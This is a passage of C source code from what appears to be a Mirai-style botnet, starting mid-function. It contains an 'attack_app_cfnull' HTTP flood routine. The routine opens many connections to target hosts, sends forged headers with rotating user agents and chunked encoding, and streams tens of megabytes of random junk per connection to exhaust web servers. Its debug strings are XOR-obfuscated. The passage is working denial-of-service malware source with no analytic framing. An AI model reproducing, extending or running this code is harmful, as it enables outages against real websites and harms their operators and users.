                            printf((char*)util_decrypt("\x51\x62\x7E\x7E\x7A\x2A\x6C\x66\x65\x65\x6E\x57\x2A\x42\x5E\x5E\x5A\x55\x49\x45\x44\x44\x55\x5B\x5F\x4F\x5F\x4F\x55\x58\x4F\x59\x5E\x4B\x58\x5E\x2A\x4C\x4E\x2F\x6E\x2A\x69\x65\x64\x64\x6F\x69\x7E\x63\x65\x64\x2A\x6D\x78\x6B\x69\x6F\x6C\x7F\x66\x66\x73\x2A\x69\x66\x65\x79\x6F\x6E\x00\x0A", 72), conn->fd);
#endif
                            errno = ECONNRESET;
                            ret = -1; // Fall through to closing connection below
                        }
                        if (ret == -1)
                        {
                            if (errno != EAGAIN && errno != EWOULDBLOCK)
                            {
#ifdef DEBUG
                                printf((char*)util_decrypt("\x51\x62\x7E\x7E\x7A\x2A\x6C\x66\x65\x65\x6E\x57\x2A\x42\x5E\x5E\x5A\x55\x49\x45\x44\x44\x55\x5B\x5F\x4F\x5F\x4F\x55\x58\x4F\x59\x5E\x4B\x58\x5E\x2A\x4C\x4E\x2F\x6E\x2A\x66\x65\x79\x7E\x2A\x69\x65\x64\x64\x6F\x69\x7E\x63\x65\x64\x00\x0A", 59), conn->fd);
#endif
                                close(conn->fd);
                                conn->fd = -1;
                                conn->state = HTTP_CONN_INIT;
                            }
                            break;
                        }    
                    }
                    if (conn->state != HTTP_CONN_INIT)
                        conn->state = HTTP_CONN_RESTART;
                }
            }
        }

        // handle any sockets that didnt return from select here
        // also handle timeout on HTTP_CONN_QUEUE_RESTART just in case there was no other data to be read (^: (usually this will never happen)
#ifdef DEBUG
        if (sockets == 1)
        {
            printf((char*)util_decrypt("\x6E\x6F\x68\x7F\x6D\x2A\x67\x65\x6E\x6F\x2A\x79\x66\x6F\x6F\x7A\x00\x0A", 18));
            sleep(1);
        }
#endif
    }
}

void attack_app_cfnull(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, ii, rfd, ret = 0;
    struct attack_cfnull_state *http_table = NULL;
    char *domain = attack_get_opt_str(opts_len, opts, ATK_OPT_DOMAIN, NULL);
    int sockets = attack_get_opt_int(opts_len, opts, ATK_OPT_CONNS, 1);

    char generic_memes[10241] = {0};

    if (domain == NULL)
        return;

    if (util_strlen(domain) > HTTP_DOMAIN_MAX - 1)
        return;

    if (sockets > HTTP_CONNECTION_MAX)
        sockets = HTTP_CONNECTION_MAX;

    http_table = calloc(sockets, sizeof(struct attack_cfnull_state));

    for (i = 0; i < sockets; i++)
    {
        http_table[i].state = HTTP_CONN_INIT;
        http_table[i].fd = -1;
        http_table[i].dst_addr = targs[i % targs_len].addr;

        util_strcpy(http_table[i].domain, domain);

        if (targs[i % targs_len].netmask < 32)
            http_table[i].dst_addr = htonl(ntohl(targs[i % targs_len].addr) + (((uint32_t)rand_next()) >> targs[i % targs_len].netmask));

        switch(rand_next() % 5)
        {
            case 0:
                table_unlock_val(TABLE_HTTP_ONE);
                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_ONE, NULL));
                table_lock_val(TABLE_HTTP_ONE);
                break;
            case 1:
                table_unlock_val(TABLE_HTTP_TWO);
                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_TWO, NULL));
                table_lock_val(TABLE_HTTP_TWO);
                break;
            case 2:
                table_unlock_val(TABLE_HTTP_THREE);
                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_THREE, NULL));
                table_lock_val(TABLE_HTTP_THREE);
                break;
            case 3:
                table_unlock_val(TABLE_HTTP_FOUR);
                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_FOUR, NULL));
                table_lock_val(TABLE_HTTP_FOUR);
                break;
            case 4:
                table_unlock_val(TABLE_HTTP_FIVE);
                util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_FIVE, NULL));
                table_lock_val(TABLE_HTTP_FIVE);
                break;
        }
    }

    while(TRUE)
    {
        fd_set fdset_rd, fdset_wr;
        int mfd = 0, nfds;
        struct timeval tim;
        struct attack_cfnull_state *conn;
        uint32_t fake_time = time(NULL);

        FD_ZERO(&fdset_rd);
        FD_ZERO(&fdset_wr);

        for (i = 0; i < sockets; i++)
        {
            conn = &(http_table[i]);

            if (conn->state == HTTP_CONN_RESTART)
            {
                conn->state = HTTP_CONN_INIT;
            }

            if (conn->state == HTTP_CONN_INIT)
            {
                struct sockaddr_in addr = {0};

                if (conn->fd != -1)
                    close(conn->fd);
                if ((conn->fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
                    continue;

                fcntl(conn->fd, F_SETFL, O_NONBLOCK | fcntl(conn->fd, F_GETFL, 0));

                ii = 65535;
                setsockopt(conn->fd, 0, SO_RCVBUF, &ii ,sizeof(int));

                addr.sin_family = AF_INET;
                addr.sin_addr.s_addr = conn->dst_addr;
                addr.sin_port = htons(80);

                conn->last_recv = fake_time;
                conn->state = HTTP_CONN_CONNECTING;
                connect(conn->fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));
#ifdef DEBUG
                printf((char*)util_decrypt("\x51\x62\x7E\x7E\x7A\x2A\x6C\x66\x65\x65\x6E\x57\x2A\x6C\x6E\x2F\x6E\x2A\x79\x7E\x6B\x78\x7E\x6F\x6E\x2A\x69\x65\x64\x64\x6F\x69\x7E\x00\x0A", 35), conn->fd);
#endif

                FD_SET(conn->fd, &fdset_wr);
                if (conn->fd > mfd)
                    mfd = conn->fd + 1;
            }
            else if (conn->state == HTTP_CONN_CONNECTING)
            {
                if (fake_time - conn->last_recv > 30)
                {
                    conn->state = HTTP_CONN_INIT;
                    close(conn->fd);
                    conn->fd = -1;
                    continue;
                }

                FD_SET(conn->fd, &fdset_wr);
                if (conn->fd > mfd)
                    mfd = conn->fd + 1;
            }
            else if (conn->state == HTTP_CONN_SEND_HEADERS)
            {
#ifdef DEBUG
                //printf((char*)util_decrypt("\x51\x62\x7E\x7E\x7A\x2A\x6C\x66\x65\x65\x6E\x57\x2A\x59\x6F\x64\x6E\x63\x64\x6D\x2A\x62\x7E\x7E\x7A\x2A\x78\x6F\x7B\x7F\x6F\x79\x7E\x00\x0A", 35));
#endif

                char buf[10240];
                util_zero(buf, 10240);

                //util_strcpy(buf + util_strlen(buf), (char*)util_decrypt("\x5A\x45\x59\x5E\x2A\x25\x69\x6E\x64\x27\x69\x6D\x63\x25\x66\x25\x69\x62\x61\x55\x69\x6B\x7A\x7E\x69\x62\x6B\x2A\x42\x5E\x5E\x5A\x25\x3B\x24\x3B\x07\x00\x5F\x79\x6F\x78\x27\x4B\x6D\x6F\x64\x7E\x30\x2A\x0A", 51));
                util_strcpy(buf + util_strlen(buf), (char*)util_decrypt("\x5A\x45\x59\x5E\x2A\x25\x69\x6E\x64\x27\x69\x6D\x63\x25\x0A", 15));
                rand_alphastr(buf + util_strlen(buf), 16);
                util_strcpy(buf + util_strlen(buf), (char*)util_decrypt("\x2A\x42\x5E\x5E\x5A\x25\x3B\x24\x3B\x07\x00\x5F\x79\x6F\x78\x27\x4B\x6D\x6F\x64\x7E\x30\x2A\x0A", 24));
                util_strcpy(buf + util_strlen(buf), conn->user_agent);
                util_strcpy(buf + util_strlen(buf), (char*)util_decrypt("\x07\x00\x42\x65\x79\x7E\x30\x2A\x0A", 9));
                util_strcpy(buf + util_strlen(buf), conn->domain);
                util_strcpy(buf + util_strlen(buf), (char*)util_decrypt("\x07\x00\x0A", 3));

                table_unlock_val(TABLE_ATK_KEEP_ALIVE);
                util_strcpy(buf + util_strlen(buf), table_retrieve_val(TABLE_ATK_KEEP_ALIVE, NULL));
                table_lock_val(TABLE_ATK_KEEP_ALIVE);
                util_strcpy(buf + util_strlen(buf), (char*)util_decrypt("\x07\x00\x0A", 3));

                table_unlock_val(TABLE_ATK_ACCEPT);
                util_strcpy(buf + util_strlen(buf), table_retrieve_val(TABLE_ATK_ACCEPT, NULL));
                table_lock_val(TABLE_ATK_ACCEPT);
                util_strcpy(buf + util_strlen(buf), (char*)util_decrypt("\x07\x00\x0A", 3));

                table_unlock_val(TABLE_ATK_ACCEPT_LNG);
                util_strcpy(buf + util_strlen(buf), table_retrieve_val(TABLE_ATK_ACCEPT_LNG, NULL));
                table_lock_val(TABLE_ATK_ACCEPT_LNG);
                util_strcpy(buf + util_strlen(buf), (char*)util_decrypt("\x07\x00\x0A", 3));

                table_unlock_val(TABLE_ATK_CONTENT_TYPE);
                util_strcpy(buf + util_strlen(buf), table_retrieve_val(TABLE_ATK_CONTENT_TYPE, NULL));
                table_lock_val(TABLE_ATK_CONTENT_TYPE);
                util_strcpy(buf + util_strlen(buf), (char*)util_decrypt("\x07\x00\x0A", 3));

                table_unlock_val(TABLE_ATK_TRANSFER_ENCODING_HDR);
                util_strcpy(buf + util_strlen(buf), table_retrieve_val(TABLE_ATK_TRANSFER_ENCODING_HDR, NULL));
                table_lock_val(TABLE_ATK_TRANSFER_ENCODING_HDR);
                util_strcpy(buf + util_strlen(buf), (char*)util_decrypt("\x2A\x0A", 2));
                table_unlock_val(TABLE_ATK_CHUNKED);
                util_strcpy(buf + util_strlen(buf), table_retrieve_val(TABLE_ATK_CHUNKED, NULL));
                table_lock_val(TABLE_ATK_CHUNKED);
                util_strcpy(buf + util_strlen(buf), (char*)util_decrypt("\x07\x00\x0A", 3));

                util_strcpy(buf + util_strlen(buf), (char*)util_decrypt("\x07\x00\x0A", 3));

                conn->to_send = (80 * 1024 * 1024);

#ifdef DEBUG
                if (sockets == 1)
                {
                    printf((char*)util_decrypt("\x79\x6F\x64\x6E\x63\x64\x6D\x2A\x68\x7F\x6C\x30\x2A\x56\x0A", 15)%s\(char*)util_decrypt("\x00\x0A", 2), buf);
                }
#endif

                send(conn->fd, buf, util_strlen(buf), MSG_NOSIGNAL);
                conn->last_send = fake_time;

                conn->state = HTTP_CONN_SEND_JUNK;
                FD_SET(conn->fd, &fdset_wr);
                FD_SET(conn->fd, &fdset_rd);
                if (conn->fd > mfd)
                    mfd = conn->fd + 1;
            }
            else if (conn->state == HTTP_CONN_SEND_JUNK)
            {
                int sent = 0;
                char rndbuf[1025] = {0};
                util_zero(rndbuf, 1025);
                rand_alphastr(rndbuf, 1024);

                if (conn->to_send <= 0)
                {
                    send(conn->fd, (char*)util_decrypt("\x3A\x07\x00\x0A", 4), 3, MSG_NOSIGNAL);
                } else {
                    // EZZZZZZZZZ HACKS
                    if (conn->to_send < 1024)
                        rndbuf[conn->to_send] = 0;

                    if ((conn->to_send >= 1024 && (conn->to_send % 1024) == 0))
                    {
                        char szbuf[4] = {0};
                        util_zero(szbuf, 4);
                        util_itoa(1024, 16, szbuf);
                        send(conn->fd, szbuf, util_strlen(szbuf), MSG_NOSIGNAL);
                        send(conn->fd, (char*)util_decrypt("\x07\x00\x0A", 3), 2, MSG_NOSIGNAL);
                    }

                    if ((sent = send(conn->fd, rndbuf, util_strlen(rndbuf), MSG_NOSIGNAL)) == -1)
                    {
                        conn->state = HTTP_CONN_RESTART;
                        continue;
                    }

                    // if our local send buffer is full, slow down. no need to rush (^:
                    if (sent != util_strlen(rndbuf))
                    {
                        conn->state = HTTP_CONN_SNDBUF_WAIT;
                    }

                    conn->to_send -= sent;
                    FD_SET(conn->fd, &fdset_wr);
                }

                conn->last_send = fake_time;
                FD_SET(conn->fd, &fdset_rd);
                if (conn->fd > mfd)
                    mfd = conn->fd + 1;
            }
            else if (conn->state == HTTP_CONN_SNDBUF_WAIT)
            {
                FD_SET(conn->fd, &fdset_wr);
                if (conn->fd > mfd)
                    mfd = conn->fd + 1;
            }
            else
            {
                // NEW STATE WHO DIS
                conn->state = HTTP_CONN_INIT;
                close(conn->fd);
                conn->fd = -1;
            }
        }

        if (mfd == 0)
            continue;

        tim.tv_usec = 0;
        tim.tv_sec = 1;
        nfds = select(mfd, &fdset_rd, &fdset_wr, NULL, &tim);
        fake_time = time(NULL);

        if (nfds < 1)
            continue;

        for (i = 0; i < sockets; i++)
        {
            conn = &(http_table[i]);

            if (conn->fd == -1)
                continue;

            if (FD_ISSET(conn->fd, &fdset_wr))
            {
                if (conn->state == HTTP_CONN_CONNECTING)
                {
                    int err = 0;
                    socklen_t err_len = sizeof (err);

                    ret = getsockopt(conn->fd, SOL_SOCKET, SO_ERROR, &err, &err_len);
                    if (err == 0 && ret == 0)
                    {
#ifdef DEBUG
                        printf((char*)util_decrypt("\x51\x62\x7E\x7E\x7A\x2A\x6C\x66\x65\x65\x6E\x57\x2A\x4C\x4E\x2F\x6E\x2A\x69\x65\x64\x64\x6F\x69\x7E\x6F\x6E\x24\x00\x0A", 30), conn->fd);
#endif
                        conn->state = HTTP_CONN_SEND;
                    }
                    else
                    {
#ifdef DEBUG
                        printf((char*)util_decrypt("\x51\x62\x7E\x7E\x7A\x2A\x6C\x66\x65\x65\x6E\x57\x2A\x4C\x4E\x2F\x6E\x2A\x6F\x78\x78\x65\x78\x2A\x7D\x62\x63\x66\x6F\x2A\x69\x65\x64\x64\x6F\x69\x7E\x63\x64\x6D\x2A\x37\x2A\x2F\x6E\x00\x0A", 47), conn->fd, err);
#endif
                        close(conn->fd);
                        conn->fd = -1;
                        conn->state = HTTP_CONN_INIT;
                        continue;
                    }
                }
                else if (conn->state == HTTP_CONN_SNDBUF_WAIT)
                {
					conn->state = HTTP_CONN_SEND_JUNK;
                }
            }

            if (FD_ISSET(conn->fd, &fdset_rd))
            {
                // if we get any sort of headers or error code then punt it.
                // we really dont care about any content we get
                conn->state = HTTP_CONN_RESTART;
            }
        }

        // handle any sockets that didnt return from select here
        // also handle timeout on HTTP_CONN_QUEUE_RESTART just in case there was no other data to be read (^: (usually this will never happen)
#ifdef DEBUG
        if (sockets == 1)
        {
            printf((char*)util_decrypt("\x6E\x6F\x68\x7F\x6D\x2A\x67\x65\x6E\x6F\x2A\x79\x66\x6F\x6F\x7A\x00\x0A", 18));
            sleep(1);
        }
#endif
    }
}

